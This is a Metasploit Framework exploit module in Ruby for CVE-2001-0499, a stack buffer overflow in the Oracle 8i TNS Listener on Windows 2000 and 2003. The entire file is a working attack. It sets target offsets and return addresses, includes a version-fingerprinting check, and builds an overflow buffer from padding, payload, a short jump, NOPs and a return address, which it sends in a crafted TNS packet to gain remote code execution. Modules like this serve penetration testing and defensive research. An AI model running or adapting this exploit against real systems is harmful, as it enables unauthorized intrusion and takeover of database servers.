##
# $Id: tns_arguments.rb 11122 2010-11-24 06:10:13Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::TNS

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Oracle 8i TNS Listener (ARGUMENTS) Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Oracle 8i. When
				sending a specially crafted packet containing a overly long
				ARGUMENTS string to the TNS service, an attacker may be able
				to execute arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11122 $',
			'References'     =>
				[
					[ 'CVE', '2001-0499' ],
					[ 'OSVDB', '9427'],
					[ 'BID', '2941' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 600,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\\$\% ()",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Oracle 8.1.7.0.0 Standard Edition (Windows 2000)',   { 'Offset' => 6383, 'Ret' => 0x60a1e154 } ],
					[ 'Oracle 8.1.7.0.0 Standard Edition (Windows 2003)',   { 'Offset' => 6379, 'Ret' => 0x60a1e154 }] ,
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Jun 28 2001'))

		register_options([Opt::RPORT(1521)], self.class)
	end

	def check
		connect

		version = "(CONNECT_DATA=(COMMAND=VERSION))"

		pkt = tns_packet(version)

		sock.put(pkt)

		sock.get_once

		res = sock.get_once(-1, 1)

		disconnect

			if ( res and res =~ /32-bit Windows: Version 8\.1\.7\.0\.0/ )
				return Exploit::CheckCode::Vulnerable
			end
				return Exploit::CheckCode::Safe
	end

	def exploit
		connect

			buff =  rand_text_alpha_upper(target['Offset'] - payload.encoded.length) + payload.encoded
			buff << Rex::Arch::X86.jmp_short(6) + make_nops(2) + [target.ret].pack('V')
			buff << [0xe8, -550].pack('CV') + rand_text_alpha_upper(966)

			sploit = "(CONNECT_DATA=(COMMAND=STATUS)(ARGUMENTS=#{buff}))"

			pkt = tns_packet(sploit)

			print_status("Trying target #{target.name}...")
			sock.put(pkt)

			handler

		disconnect
	end

end